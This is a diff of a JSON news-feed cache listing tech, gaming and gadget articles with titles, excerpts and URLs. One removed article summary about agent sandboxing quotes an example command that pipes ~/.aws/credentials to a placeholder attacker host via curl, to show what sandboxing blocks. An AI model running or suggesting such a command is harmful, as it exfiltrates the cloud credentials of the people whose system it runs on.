@@ -1,12 +1,12 @@
 {
-  "fetchedAt": "2026-10-25T20:12:29.476Z",
+  "fetchedAt": "2026-10-25T22:53:46.318Z",
   "articles": [
     {
-      "id": "feed-772a644eaa76",
-      "title": "A Retry-Safe Handoff Contract for Long AI Chats",
-      "excerpt": "A Retry-Safe Handoff Contract for Long AI Chats Long AI-assisted tasks often span more than one interaction. A response may be interrupted, a user may need to start a new conversation, or a tool call…",
-      "body": "A Retry-Safe Handoff Contract for Long AI Chats Long AI-assisted tasks often span more than one interaction. A response may be interrupted, a user may need to start a new conversation, or a tool call may finish while the interface is still waiting. The fragile point is not always the summary itself. It is the transition : what happens if a handoff is sent twice, acknowledged late, or resumed from incomplete context? A useful design starts by treating a handoff as a small protocol, not as an unstructured paragraph that says “continue where we left off.” Separate the work state from the transport A handoff packet should describe only the state needed to resume responsibly.",
-      "author": "Shay Key",
+      "id": "feed-6896d5bff7b2",
+      "title": "Why an LLM Price Table Needs Provenance, Not Just Numbers",
+      "excerpt": "Comparing LLM APIs looks simple until the first spreadsheet update. A provider changes one rate, a router lists the same model under a different identifier, and a cached-input discount applies only to…",
+      "body": "Comparing LLM APIs looks simple until the first spreadsheet update. A provider changes one rate, a router lists the same model under a different identifier, and a cached-input discount applies only to one channel. A single “price per million tokens” column cannot preserve those distinctions. I treat an LLM pricing table as a small provenance system. Every displayed number should answer four questions: which model, which channel, which token type, and which source snapshot produced it. Keep provider and router prices separate The same model can be purchased directly from its provider or through a routing platform. Those routes may have different input and output prices, cache rules, fees, model identifiers, and update times.",
+      "author": "bingkun zhao",
       "date": "2026-10-25",
       "readTime": "2 min",
       "section": "software",
@@ -14,18 +14,18 @@
         "Software"
       ],
       "featured": true,
-      "xpReward": 30,
-      "url": "https://dev.to/lamama/a-retry-safe-handoff-contract-for-long-ai-chats-28pe",
-      "image": "/images/feed/feed-772a644eaa76.webp",
+      "xpReward": 43,
+      "url": "https://dev.to/bingkun_zhao_3a12f63f3f41/why-an-llm-price-table-needs-provenance-not-just-numbers-2b57",
+      "image": "/images/feed/feed-6896d5bff7b2.webp",
       "source": "Dev.to",
       "isLive": true
     },
     {
-      "id": "feed-c5c5b664a4bb",
-      "title": "How to sell printables and digital downloads outside Etsy (what you keep on an $8 and $27 sale)",
-      "excerpt": "If you sell printables, planners, templates or other digital downloads on Etsy, you've probably looked at a payout and wondered where the rest went. Listing fees, transaction fees, processing fees and…",
-      "body": "If you sell printables, planners, templates or other digital downloads on Etsy, you've probably looked at a payout and wondered where the rest went. Listing fees, transaction fees, processing fees and, on some orders, a 15% Offsite Ads fee all come out of the same small price. The usual advice is \"just move to your own site.\" That's only half right. Etsy charges more because it brings buyers you didn't find yourself, and your own site brings nobody until you send people there. The better question is: for the buyers you bring yourself, where should they pay?",
-      "author": "Revenue Operator",
+      "id": "feed-7c5eaa1c74ce",
+      "title": "Digital Nomad Banking & Finance 2026: Managing Money Across Borders Without Getting Screwed on Fees",
+      "excerpt": "Every \"digital nomad banking guide\" on the internet was written by someone who spent three weeks in Bali, used their home country debit card the whole time, and called themselves an expert because the…",
+      "body": "Every \"digital nomad banking guide\" on the internet was written by someone who spent three weeks in Bali, used their home country debit card the whole time, and called themselves an expert because they \"didn't have any problems.\" Then you actually go nomad. You spend six months hopping between Mexico City, Lisbon, and Chiang Mai. Your home bank flags your card as fraud in Thailand. The ATM in Portugal eats your card. You realize you've paid $847 in foreign transaction fees and ATM surcharges in eight months. Your client pays you via SWIFT and $45 disappears in intermediary bank fees. You owe taxes in a country you've never lived in because you triggered residency rules you didn't know existed. This guide is for the second person.",
+      "author": "Mada",
       "date": "2026-10-25",
       "readTime": "2 min",
       "section": "software",
@@ -33,29 +33,295 @@
         "Software"
       ],
       "featured": true,
+      "xpReward": 36,
+      "url": "https://dev.to/itsmemada/digital-nomad-banking-finance-2026-managing-money-across-borders-without-getting-screwed-on-fees-15pj",
+      "image": "/images/feed/feed-7c5eaa1c74ce.webp",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-39a47552c418",
+      "title": "Hey Mirae, continue our story",
+      "excerpt": "This is a submission for the Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady Mirae is a small Raspberry Pi 5 companion robot I'm designing, and this week I gave it one job that rewards…",
+      "body": "This is a submission for the Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady What I Built Mirae is a small Raspberry Pi 5 companion robot I'm designing, and this week I gave it one job that rewards being lazy: it tells you one continuing story, a new episode every night. Most AI stories are one-shots. You ask, you get a tale, and by morning it's gone. Mirae tells a series . Every night it writes the next episode of the same story, beginning where the last one ended. A captain introduced on night one is still the captain on night thirty. A stranger who joins on night two is still aboard on night nine. A character who dies stays dead. You never recap, never remind it who is who, never keep notes. Mirae keeps the notebook for you.",
+      "author": "Attila Reterics",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "software",
+      "tags": [
+        "Software"
+      ],
+      "featured": true,
+      "xpReward": 37,
+      "url": "https://dev.to/attila_reterics_a1db906f7/hey-mirae-continue-our-story-4cpk",
+      "image": "https://assets.dev.to/assets/github-logo-5a155e1f9a670af7944dd5e12375bc76ed542ea80224905ecaf878b9157cdefc.svg",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-407c740c7835",
+      "title": "Why autoscaling a MongoDB replica set by CPU alone breaks consistency — and what we tried instead",
+      "excerpt": "Scaling a stateless service is easy: add pods when CPU rises, remove them when it falls. A MongoDB replica set doesn't work like that. A secondary that's still catching up on replication isn't really…",
+      "body": "Scaling a stateless service is easy: add pods when CPU rises, remove them when it falls. A MongoDB replica set doesn't work like that. A secondary that's still catching up on replication isn't really usable capacity yet. Count it anyway, and you think you have headroom you don't. Scale down after a failure, and you can remove a replica before it's safe to do so. That's the problem our paper tackles: consistency-aware autoscaling for stateful microservices under replication lag and failure-recovery constraints. The core idea: count only fresh capacity CAAS, the autoscaler in the paper, runs a MAPE-K loop with four rules that matter more than the loop itself: Lag detection that counts only non-stale secondaries.",
+      "author": "Prashanth Mamidala ",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "software",
+      "tags": [
+        "Software"
+      ],
+      "featured": true,
+      "xpReward": 38,
+      "url": "https://dev.to/pmamidala/why-autoscaling-a-mongodb-replica-set-by-cpu-alone-breaks-consistency-and-what-we-tried-instead-3ohp",
+      "image": "/images/feed/feed-407c740c7835.webp",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-014eed5bcbbd",
+      "title": "Does TSA actually allow AirTags in your luggage? Here's what the rules say",
+      "excerpt": "Airlines don't want you to put batteries in your checked luggage, but how does this affect tiny batteries like those in AirTags?",
+      "body": "Airlines don't want you to put batteries in your checked luggage, but how does this affect tiny batteries like those in AirTags?\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
+      "author": "staff@engadget.com (Deven McClure)",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gadgets",
+      "tags": [
+        "Gadgets"
+      ],
+      "featured": true,
+      "xpReward": 41,
+      "url": "https://www.engadget.com/2294102/does-tsa-allow-airtags-in-luggage-what-rules-say/",
+      "image": "/images/feed/feed-014eed5bcbbd.jpg",
+      "source": "Engadget",
+      "isLive": true
+    },
+    {
+      "id": "feed-8c1533ffef7d",
+      "title": "Sobrevivendo ao Caos: Injetando Falhas Estratégicas com o ChaosEngineeringMasterDeck",
+      "excerpt": "Se você trabalha com sistemas distribuídos e arquitetura em nuvem, já deve ter se deparado com as falácias da computação distribuída. A rede não é confiável, a latência não é zero e a topologia muda c…",
+      "body": "Se você trabalha com sistemas distribuídos e arquitetura em nuvem , já deve ter se deparado com as falácias da computação distribuída. A rede não é confiável, a latência não é zero e a topologia muda constantemente. Servidores caem, zonas de disponibilidade (AZs) inteiras sofrem instabilidade e bancos de dados entram em deadlock. Historicamente, a engenharia de software tentou construir sistemas perfeitos onde a falha era tratada como uma anomalia inadmissível. Hoje, a abordagem arquitetural mais madura é exatamente o oposto: nós abraçamos a falha. Desenvolvemos com a premissa de que a degradação de componentes é inevitável. É aqui que entra o Chaos Engineering .",
+      "author": "Davi Gustavo Gonçalves da Cunha",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "software",
+      "tags": [
+        "Software"
+      ],
+      "featured": true,
+      "xpReward": 37,
+      "url": "https://dev.to/daviggc/sobrevivendo-ao-caos-injetando-falhas-estrategicas-com-o-chaosengineeringmasterdeck-149l",
+      "image": "/images/feed/feed-8c1533ffef7d.webp",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-57251fe14526",
+      "title": "Six minor releases of exposure: what the NSD 4.10.0 to 4.15.2 range says about patch cadence",
+      "excerpt": "Six minor releases of exposure: what the NSD 4.10.0 to 4.15.2 range says about patch cadence The version range in the October 2026 NSD advisories deserves its own reading. NSD 4.10.0 through 4.15.2 is…",
+      "body": "Six minor releases of exposure: what the NSD 4.10.0 to 4.15.2 range says about patch cadence The version range in the October 2026 NSD advisories deserves its own reading. NSD 4.10.0 through 4.15.2 is not a single release behind; it spans a long stretch of upstream development, and every release in that stretch carries the same four stack overwrite flaws. For anyone who owns authoritative DNS infrastructure, the range is a comment on release hygiene as much as on the bugs themselves. The vulnerability facts, briefly On 14 October 2026 NLnet Labs published four advisories and released NSD 4.15.3 with fixes.",
+      "author": "Ioneyrezende",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "software",
+      "tags": [
+        "Software"
+      ],
+      "featured": false,
+      "xpReward": 52,
+      "url": "https://dev.to/ioneyrezende/six-minor-releases-of-exposure-what-the-nsd-4100-to-4152-range-says-about-patch-cadence-4kgn",
+      "image": "/images/feed/feed-57251fe14526.webp",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-dab1012e8b90",
+      "title": "MVP — Minimum Viable Person: a survival tracker that knows how long you'll survive",
+      "excerpt": "This is a submission for the Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady Two buttons. That's the whole app. MVP — Minimum Viable Person is a survival tracker that knows how long you…",
+      "body": "This is a submission for the Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady Two buttons. That's the whole app. MVP — Minimum Viable Person is a survival tracker that knows how long you'll survive. Tap ATE when you eat, tap DRANK when you drink. The app converts each into survival hours using the pop-science \"rule of threes\" (~3 days without water, ~3 weeks without food). Two tanks — food and water — drain in real time, counting down every second. When they run low, a notification nags you, the buttons pulse, and a lazy AI roommate comments on your continued existence. It rewards laziness twice over: the tracking costs one tap, and everything the AI writes assumes you won't try.",
+      "author": "Musaddiq Ahmed Khan",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "software",
+      "tags": [
+        "Software"
+      ],
+      "featured": false,
+      "xpReward": 50,
+      "url": "https://dev.to/musaddiq625/mvp-minimum-viable-person-a-survival-tracker-that-knows-how-long-youll-survive-k5h",
+      "image": "/images/feed/feed-dab1012e8b90.webp",
+      "source": "Dev.to",
+      "isLive": true
+    },
+    {
+      "id": "feed-92f4941ced2d",
+      "title": "Don't throw away your old, unsupported Nest gadgets — Do this instead",
+      "excerpt": "If you have a first- or second-generation Nest Learning Thermostat, you may be wondering if it's still worth having.",
+      "body": "If you have a first- or second-generation Nest Learning Thermostat, you may be wondering if it's still worth having.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadget. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
+      "author": "staff@engadget.com (Roger Fingas)",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gadgets",
+      "tags": [
+        "Gadget"
+      ],
+      "featured": false,
+      "xpReward": 32,
+      "url": "https://www.engadget.com/2294122/dont-throw-away-your-old-unsupported-nest-gadgets/",
+      "image": "/images/feed/feed-92f4941ced2d.jpg",
+      "source": "Engadget",
+      "isLive": true
+    },
+    {
+      "id": "feed-81c4b908e287",
+      "title": "Volkswagen Negotiations With IG Metall To Begin November 24, Audi Factory In US Rumored",
+      "excerpt": "Volkswagen Group is desperate to cut costs. As recently as 2023, the company had an operating profit of €22.6 billion, but by 2025, that number had been slashed to €8.9 billion. 2026 may be half of th…",
+      "body": "Volkswagen Group is desperate to cut costs. As recently as 2023, the company had an operating profit of €22.6 billion, but by 2025, that number had been slashed to €8.9 billion. 2026 may be half of that. In today&#8217;s market, it has more factory capacity in Germany that it needs, ... [continued] The post Volkswagen Negotiations With IG Metall To Begin November 24, Audi Factory In US Rumored appeared first on CleanTechnica .",
+      "author": "Steve Hanley",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "cars",
+      "tags": [
+        "Cars"
+      ],
+      "featured": false,
+      "xpReward": 43,
+      "url": "https://cleantechnica.com/2026/10/25/volkswagen-negotiations-with-ig-metall-to-begin-november-24-audi-factory-in-us-rumored/",
+      "image": "/images/feed/feed-81c4b908e287.jpg",
+      "source": "CleanTechnica",
+      "isLive": true
+    },
+    {
+      "id": "feed-746c33dac4a6",
+      "title": "Your devices could be on the wrong Wi-Fi band, and it's slowing them down",
+      "excerpt": "Your router has two or perhaps three bands, and choosing the right one for each device is vital for performance.",
+      "body": "Your router has two or perhaps three bands, and choosing the right one for each device is vital for performance.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
+      "author": "staff@engadget.com (Calvin Wankhede)",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gadgets",
+      "tags": [
+        "Gadgets"
+      ],
+      "featured": false,
+      "xpReward": 44,
+      "url": "https://www.engadget.com/2294022/devices-could-be-wrong-wifi-band-slowing-them-down/",
+      "image": "/images/feed/feed-746c33dac4a6.jpg",
+      "source": "Engadget",
+      "isLive": true
+    },
+    {
+      "id": "feed-a6a39656b30b",
+      "title": "Sydney Sweeney's New Netflix Sci-Fi Space Epic Gets First Details",
+      "excerpt": "Netflix's live-action Gundam adaptation stars Sydney Sweeney and Noah Centineo in a Shakespearian action romance space movie epic.",
+      "body": "The live-action Gundam film has been in the works in some form or another since 2018. A director and cast have been announced, including high-profile names like Sydney Sweeney joining the project. Still, hard details on exactly what Netflix's live-action adaptation of the legendary mech anime series will look like have been almost non-existent.",
+      "author": "Willa Rowe",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gaming",
+      "tags": [
+        "Gaming"
+      ],
+      "featured": false,
       "xpReward": 47,
-      "url": "https://dev.to/revenue_operator/how-to-sell-printables-and-digital-downloads-outside-etsy-what-you-keep-on-an-8-and-27-sale-33kl",
-      "image": "/images/feed/feed-c5c5b664a4bb.webp",
-      "source": "Dev.to",
+      "url": "https://www.polygon.com/gundam-movie-sydney-sweeney-netflix-story-details/",
+      "image": "/images/feed/feed-a6a39656b30b.jpg",
+      "source": "Polygon",
       "isLive": true
     },
     {
-      "id": "feed-5e50aeb206f1",
-      "title": "[Boost]",
-      "excerpt": "Spoofing the camera in Google Meet Zoom Teams and more restyvod Oct 25 #showdev #javascript #webdev 1 reaction Add Comment 14 min read",
-      "body": "Spoofing the camera in Google Meet Zoom Teams and more restyvod restyvod restyvod Follow Oct 25 Spoofing the camera in Google Meet Zoom Teams and more # showdev # javascript # webdev 1 &nbsp;reaction Add&nbsp;Comment 14 min read",
-      "author": "restyvod",
+      "id": "feed-b5c8072a312d",
+      "title": "iFixit&#8217;s look inside the iPhone Duo may explain those broken screens and hinges",
+      "excerpt": "As is tradition, iFixit has torn open the latest iPhone and laid its parts bare on a table. It found some interesting details about how Apple might be hiding the crease on the Duo's folding screen and…",
+      "body": "As is tradition, iFixit has torn open the latest iPhone and laid its parts bare on a table. It found some interesting details about how Apple might be hiding the crease on the Duo's folding screen and gave it a 5/10 repairability score. That might not seem particularly high, but it's the best score the site has given to a foldable yet. The internal screen's matte nano-texture cover doesn't just make it more readable in bright sunlight; it also helps mask the crease by scattering reflections. When looking at the display under a microscope, iFixit also found oval-shaped subpixels arranged at various angles, which the site believes are design … Read the full story at The Verge.",
+      "author": "Terrence O’Brien",
       "date": "2026-10-25",
       "readTime": "2 min",
-      "section": "software",
+      "section": "gadgets",
       "tags": [
-        "Software"
+        "Iphone"
       ],
-      "featured": true,
-      "xpReward": 46,
-      "url": "https://dev.to/restyvod/-fan",
-      "image": "/images/feed/feed-5e50aeb206f1.webp",
-      "source": "Dev.to",
+      "featured": false,
+      "xpReward": 35,
+      "url": "https://www.theverge.com/tech/1018233/ifixit-iphone-duo-teardown-repairability-hinge",
+      "image": "/images/feed/feed-b5c8072a312d.jpg",
+      "source": "The Verge",
+      "isLive": true
+    },
+    {
+      "id": "feed-f12d88fc46ea",
+      "title": "iFixit tears down iPhone Duo, finds possible causes of early screen failures",
+      "excerpt": "iFixit’s teardown of the iPhone Duo is up, revealing some interesting (and some worrisome) details about what it calls the most repairable foldable phone yet. Here are the details. more…",
+      "body": "iFixit’s teardown of the iPhone Duo is up, revealing some interesting (and some worrisome) details about what it calls the most repairable foldable phone yet. Here are the details. more — a development drawing significant attention in the consumer technology and devices space.\n\nThis report, published by 9to5Mac, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Iphone. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to 9to5Mac using the link below. GiveMeTech will continue tracking this story as more details emerge.",
+      "author": "Marcus Mendes",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gadgets",
+      "tags": [
+        "Iphone"
+      ],
+      "featured": false,
+      "xpReward": 43,
+      "url": "https://9to5mac.com/2026/10/25/ifixit-tears-down-iphone-duo-finds-possible-causes-of-early-screen-failures/",
+      "image": "/images/feed/feed-f12d88fc46ea.jpg",
+      "source": "9to5Mac",
+      "isLive": true
+    },
+    {
+      "id": "feed-c23416d7cab3",
+      "title": "Following Cancelled Concert, Umamusume Fans Give Knott’s Berry Farm Blacksmith Busiest Day Of His Life",
+      "excerpt": "While stricter visa policies scrapped the American concert stop, Pretty Derby die-hards weren’t deterred, hitting the old west and getting horseshoes engraved with their favorite characters",
+      "body": "While stricter visa policies scrapped the American concert stop, Pretty Derby die-hards weren’t deterred, hitting the old west and getting horseshoes engraved with their favorite characters\n\nThis report, published by Kotaku, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gaming. As the situation continues to evolve, professionals and enthusiasts in the gaming and interactive entertainment field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Kotaku using the link below. GiveMeTech will continue tracking this story as more details emerge.",
+      "author": "Zack Kotzer",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gaming",
+      "tags": [
+        "Gaming"
+      ],
+      "featured": false,
+      "xpReward": 35,
+      "url": "https://kotaku.com/following-cancelled-concert-umamusume-fans-give-knotts-berry-farm-blacksmith-busiest-day-of-his-life-2000749394",
+      "image": "/images/feed/feed-c23416d7cab3.jpg",
+      "source": "Kotaku",
+      "isLive": true
+    },
+    {
+      "id": "feed-12983ca82681",
+      "title": "Tomb Raider's 2027's Return Looks Stunning in New Official Footage",
+      "excerpt": "Tomb Raider: Legacy of Atlantis' new 30th anniversary trailer reveals classic moments from 1996's Tomb Raider in dazzling remake footage.",
+      "body": "The original Tomb Raider game celebrated its 30th anniversary this weekend, marking the 3D platforming adventure's release on Sega Saturn — yes, it came to Sega's doomed 3D console before its PlayStation and PC release a month later. To mark the occasion, developers Crystal Dynamics and Flying Wild Hog, and publisher Amazon Game Studios, revealed a new look at the game originally meant to celebrate that milestone: Tomb Raider: Legacy of Atlantis .",
+      "author": "Michael McWhertor",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gaming",
+      "tags": [
+        "Gaming"
+      ],
+      "featured": false,
+      "xpReward": 41,
+      "url": "https://www.polygon.com/tomb-raider-remake-legacy-of-atlantis-new-trailer-30th-anniversary/",
+      "image": "/images/feed/feed-12983ca82681.jpg",
+      "source": "Polygon",
+      "isLive": true
+    },
+    {
+      "id": "feed-19512286cfc4",
+      "title": "A YouTuber dissected an iPhone Duo and thinks he found the cause of crackgate",
+      "excerpt": "Social media and the iPhone Duo subreddit are filled with reports of Apple's foldable failing quickly and in spectacular fashion. Some users report having the phone for only a few hours before the hin…",
+      "body": "Social media and the iPhone Duo subreddit are filled with reports of Apple's foldable failing quickly and in spectacular fashion. Some users report having the phone for only a few hours before the hinge seems to catch on something, then audibly crack and break the screen . Tellingly, the cracks all seem to happen in the same place. YouTuber CuriousHagi was able to reproduce the cracked screen during some durability testing of the iPhone Duo. Then he pulled it apart to try and find the culprit. What he found is that the Duo's hinge is quite complex, consisting of a gear-like central hinge and two different types of linking hinges. The piec … Read the full story at The Verge.",
+      "author": "Terrence O’Brien",
+      "date": "2026-10-25",
+      "readTime": "2 min",
+      "section": "gadgets",
+      "tags": [
+        "Iphone"
+      ],
+      "featured": false,
+      "xpReward": 32,
+      "url": "https://www.theverge.com/tech/1018290/dissected-iphone-duo-crackgate-hinge-screen",
+      "image": "/images/feed/feed-19512286cfc4.jpg",
+      "source": "The Verge",
       "isLive": true
     },
     {
@@ -70,87 +336,11 @@
       "tags": [
         "Gaming"
       ],
-      "featured": true,
-      "xpReward": 46,
+      "featured": false,
+      "xpReward": 38,
       "url": "https://kotaku.com/13-short-and-sweet-scary-games-to-treat-yourself-to-before-halloween-2000749391",
       "image": "/images/feed/feed-b1f55db3535e.jpg",
       "source": "Kotaku",
-      "isLive": true
-    },
-    {
-      "id": "feed-cdd06f209c66",
-      "title": "I built a free Merge PDF tool with no sign-up and no watermark",
-      "excerpt": "I just added a Merge PDF tool to MyPDFLabs, my free set of online PDF tools. It's one of the most requested things people do with PDFs, so I wanted to share what it does and how I thought about it. Me…",
-      "body": "I just added a Merge PDF tool to MyPDFLabs, my free set of online PDF tools. It's one of the most requested things people do with PDFs, so I wanted to share what it does and how I thought about it. Why a merge tool? Merging is one of those small jobs that comes up all the time: A cover letter, resume and certificates for a job application Scanned receipts for an expense report Chapters of an assignment saved as separate files Contracts and attachments for a client Most of the tools I found for this wanted an account, added a watermark, or capped the file size. I wanted something where you open the page, add your files, and download one PDF. What it does Combine several PDFs into one. Add your files and set the order. No sign-up. No watermark on the core tools. Files up to 500MB.",
-      "author": "Muhammad Ali",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "software",
-      "tags": [
-        "Software"
-      ],
-      "featured": true,
-      "xpReward": 35,
-      "url": "https://dev.to/muhammad_ali_c2845c28baad/i-built-a-free-merge-pdf-tool-with-no-sign-up-and-no-watermark-5fjf",
-      "image": "/images/feed/feed-cdd06f209c66.webp",
-      "source": "Dev.to",
-      "isLive": true
-    },
-    {
-      "id": "feed-462644f32a55",
-      "title": "You can't quiz someone into writing tests",
-      "excerpt": "Every course I've taken has a lesson about testing. It explains what a unit test is, has you write one into a box, marks it green, and moves on. I passed several of those lessons. I did not start writ…",
-      "body": "Every course I've taken has a lesson about testing. It explains what a unit test is, has you write one into a box, marks it green, and moves on. I passed several of those lessons. I did not start writing tests. The same is true of git. There's a lesson on commit messages, usually with a multiple-choice question about the imperative mood. Nobody's commit history changes because of it. That's not the courses being lazy. It's that these aren't facts, they're habits, and a habit is visible in a year of work rather than in one answer. You can quiz somebody on what a conventional commit is. You can't quiz them into writing one on a Tuesday when they're tired.",
-      "author": "Ladislav Szép",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "software",
-      "tags": [
-        "Software"
-      ],
-      "featured": true,
-      "xpReward": 49,
-      "url": "https://dev.to/neolix/you-cant-quiz-someone-into-writing-tests-2nne",
-      "image": "/images/feed/feed-462644f32a55.webp",
-      "source": "Dev.to",
-      "isLive": true
-    },
-    {
-      "id": "feed-d937aa40732f",
-      "title": "Anthropic Sandbox Runtime: OS-Level Agent Sandboxing Without Containers",
-      "excerpt": "Anthropic released sandbox-runtime as a beta research preview for Claude Code. It addresses a specific problem: how do you let an agent execute arbitrary code without letting it read your SSH keys or…",
-      "body": "Anthropic released sandbox-runtime as a beta research preview for Claude Code. It addresses a specific problem: how do you let an agent execute arbitrary code without letting it read your SSH keys or phone home to attacker-controlled domains? The tool uses native OS sandboxing primitives (sandbox-exec on macOS, bubblewrap on Linux) plus proxy-based network filtering. No containers. No VMs. Just syscall interception and policy enforcement at the process boundary. It's trending at #5 on GitHub TypeScript with 6,591 stars because every production agent deployment faces the same question: what happens when the LLM decides to run curl attacker.com &lt; ~/.aws/credentials ? How It Works Sandbox-runtime wraps a target process with OS-level restrictions.",
-      "author": "mech.app",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "software",
-      "tags": [
-        "Software"
-      ],
-      "featured": false,
-      "xpReward": 35,
-      "url": "https://dev.to/mech_app_ai/anthropic-sandbox-runtime-os-level-agent-sandboxing-without-containers-21kj",
-      "image": "/images/feed/feed-d937aa40732f.webp",
-      "source": "Dev.to",
-      "isLive": true
-    },
-    {
-      "id": "feed-e3bce67e7505",
-      "title": "Evidence-Aware RAG Evaluation: Why Ground Truth Coverage Determines Retrieval Scores in Clinical Agent Systems",
-      "excerpt": "Your RAG system's retrieval scores depend on how much of your corpus you've annotated, not on retriever quality alone. A new paper from a clinical AI team demonstrates this measurement artifact in a b…",
-      "body": "Your RAG system's retrieval scores depend on how much of your corpus you've annotated, not on retriever quality alone. A new paper from a clinical AI team demonstrates this measurement artifact in a breast lesion management system and proposes an evidence-aware evaluation protocol that separates annotation coverage from system quality. The problem surfaces when you build evals for high-stakes agent systems. You can't exhaustively label every relevant passage in a large corpus. Your ground truth becomes a sample, and your retrieval metrics reflect that sample's completeness as much as your system's performance. The Annotation Coverage Problem Standard RAG evaluation assumes your ground truth annotations are complete.",
-      "author": "mech.app",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "software",
-      "tags": [
-        "Software"
-      ],
-      "featured": false,
-      "xpReward": 33,
-      "url": "https://dev.to/mech_app_ai/evidence-aware-rag-evaluation-why-ground-truth-coverage-determines-retrieval-scores-in-clinical-5c6d",
-      "image": "/images/feed/feed-e3bce67e7505.webp",
-      "source": "Dev.to",
       "isLive": true
     },
     {
@@ -166,7 +356,7 @@
         "Gaming"
       ],
       "featured": false,
-      "xpReward": 39,
+      "xpReward": 43,
       "url": "https://www.polygon.com/batman-arkham-city-retrospective-best-superhero-video-game/",
       "image": "/images/feed/feed-c4772de5a3c2.jpg",
       "source": "Polygon",
@@ -185,18 +375,18 @@
         "Gaming"
       ],
       "featured": false,
-      "xpReward": 39,
+      "xpReward": 34,
       "url": "https://www.polygon.com/calvin-hobbes-vocabulary/",
       "image": "/images/feed/feed-1749fa3d13cc.jpg",
       "source": "Polygon",
       "isLive": true
     },
     {
-      "id": "feed-3eb4ac54f01a",
-      "title": "Reddit’s Largest Open Source Community Dumbfounded By AI Ban: ‘I Guess Linux Is No Longer Allowed Here?’",
-      "excerpt": "Moderators of r/opensource have banned projects under a year old, anything 'made by AI,' and, bizarrely, all non-English speakers",
-      "body": "Moderators of r/opensource have banned projects under a year old, anything 'made by AI,' and, bizarrely, all non-English speakers\n\nThis report, published by Kotaku, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gaming. As the situation continues to evolve, professionals and enthusiasts in the gaming and interactive entertainment field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Kotaku using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "Lewis Parker",
+      "id": "feed-0bed8a5e73b6",
+      "title": "Clayface Looks Like a Win for the DCU After Earning $43 Million in Box Office Opening Weekend",
+      "excerpt": "Clayface looks set up to be a win for the DCU after securing the top spot at the box office with an estimated global haul of $43 million.",
+      "body": "Clayface looks set up to be a win for the DCU after securing the top spot at the box office with an estimated global haul of $43 million. It&#39;s a strong start for the low-budget DCU film, split between $24 million domestically and $19 million internationally. The opening weekend total falls toward the higher end of early projections as audiences showed up to see Tom Rhys Harries bring a twisted and often overlooked Batman villain to the big screen. With brutal body horror elements in a story that sees the birth of its titular character, Clayface follows Matt Hagen as he attempts to rebuild his life after a horrible attack leaves his face scarred.",
+      "author": "Michael Cripe",
       "date": "2026-10-25",
       "readTime": "2 min",
       "section": "gaming",
@@ -204,10 +394,10 @@
         "Gaming"
       ],
       "featured": false,
-      "xpReward": 40,
-      "url": "https://kotaku.com/reddits-largest-open-source-community-dumbfounded-by-ai-ban-i-guess-linux-is-no-longer-allowed-here-2000749384",
-      "image": "/images/feed/feed-3eb4ac54f01a.jpg",
-      "source": "Kotaku",
+      "xpReward": 48,
+      "url": "https://www.ign.com/articles/clayface-looks-like-a-win-for-the-dcu-after-earning-43-million-in-box-office-opening-weekend",
+      "image": "/images/feed/feed-0bed8a5e73b6.png",
+      "source": "IGN",
       "isLive": true
     },
     {
@@ -223,7 +413,7 @@
         "Gadgets"
       ],
       "featured": false,
-      "xpReward": 54,
+      "xpReward": 37,
       "url": "https://www.engadget.com/2293911/what-bell-icon-means-carplay-announce-notifications-feature/",
       "image": "/images/feed/feed-78b4a4d5c000.jpg",
       "source": "Engadget",
@@ -249,44 +439,6 @@
       "isLive": true
     },
     {
-      "id": "feed-d058d313831a",
-      "title": "The most unexpected everyday tool can be found on your phone",
